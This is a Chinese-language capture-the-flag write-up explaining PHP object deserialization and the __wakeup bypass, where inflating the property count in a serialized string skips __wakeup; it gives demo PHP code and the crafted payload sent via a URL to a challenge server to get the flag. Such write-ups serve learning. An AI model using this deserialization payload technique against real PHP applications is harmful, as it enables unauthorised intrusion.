## 题目描述

无

## 思路

打开题目，看到一段代码

![20190831114825.png](https://raw.githubusercontent.com/handbye/images/master/20190831114825.png)

代码审计走起，最重要的是这一个函数`function __wakeup()`，配合题目unserialize想到PHP的序列化和反序列化

关于PHP的序列话请参考文章：[深度剖析PHP序列化和反序列化](https://www.cnblogs.com/youyoui/p/8610068.html)

__wakeup()函数用法:

__wakeup()是用在反序列化操作中。unserialize()会检查存在一个__wakeup()方法。如果存在，则先会调用__wakeup()方法。

```php
<?php
class A{
function __wakeup(){
echo 'Hello';
}
}
$c = new A();
$d=unserialize('O:1:"A":0:{}');
?>
```

最后页面输出了Hello。在反序列化的时候存在__wakeup()函数，所以最后就会输出Hello

__wakeup()函数漏洞说明:

```php
<?php
class Student{
public $full_name = 'zhangsan';
public $score = 150;
public $grades = array();

function __wakeup() {
echo "__wakeup is invoked";
}
}

$s = new Student();
var_dump(serialize($s));
?>
```

最后页面上输出的就是Student对象的一个序列化输出:

```txt
O:7:"Student":3:{s:9:"full_name";s:8:"zhangsan";s:5:"score";i:150;s:6:"grades";a:0:{}}
```

其中在Stuedent类后面有一个数字3，整个3表示的就是Student类存在3个属性。

__wakeup()漏洞就是与整个属性个数值有关。当序列化字符串表示对象属性个数的值大于真实个数的属性时就会跳过__wakeup的执行。

当我们将上述的序列化的字符串中的对象属性个数修改为5，变为

```txt
O:7:"Student":5:{s:9:"full_name";s:8:"zhangsan";s:5:"score";i:150;s:6:"grades";a:0:{}}
```

最后执行运行的代码如下:

```php
class Student{
public $full_name = 'zhangsan';
public $score = 150;
public $grades = array();

function __wakeup() {
echo "__wakeup is invoked";
}
function __destruct() {
var_dump($this);
}
}

$s = new Student();
$stu = unserialize('O:7:"Student":5:{s:9:"full_name";s:8:"zhangsan";s:5:"score";i:150;s:6:"grades";a:0:{}}');
```

这样就成功地绕过了__wakeup()函数。

再此题中，我们也需要绕过__weakup函数，结果`?code=`的提示，需要将序列化之后的值传给code。

首先实例化xctf类并对其使用序列化（这里就实例化xctf类为对象test）

```php
<?php
class xctf{                      //定义一个名为xctf的类
public $flag = '111';            //定义一个公有的类属性$flag，值为111
public function __wakeup(){      //定义一个公有的类方法__wakeup()，输出bad requests后退出当前脚本
exit('bad requests');
}
}
$test = new xctf();           //使用new运算符来实例化该类（xctf）的对象为test
echo(serialize($test));       //输出被序列化的对象（test）
?>
```

执行结果

```txt
O:4:"xctf":1:{s:4:"flag";s:3:"111";}
```

我们要反序列化xctf类的同时还要绕过__wakeup方法的执行（如果不绕过__wakeup()方法，那么将会输出bad requests并退出脚本），__wakeup()函数漏洞原理：当序列化字符串表示对象属性个数的值大于真实个数的属性时就会跳过__wakeup的执行。因此，需要修改序列化字符串中的属性个数：

当我们将上述的序列化的字符串中的对象属性个数由真实值1修改为2，即如下所示：

```txt
O:4:"xctf":2:{s:4:"flag";s:3:"111";}
```

访问url：http://111.198.29.45:30940?code=O:4:"xctf":2:{s:4:"flag";s:3:"111";}

即可得到flag

![20190831132134.png](https://raw.githubusercontent.com/handbye/images/master/20190831132134.png)

参考文章：

- https://xz.aliyun.com/t/378
- https://blog.csdn.net/qq_41617034/article/details/91999343
- https://www.cnblogs.com/youyoui/p/8610068.html
- http://blog.sina.com.cn/s/blog_15ebf299a0102xnug.html
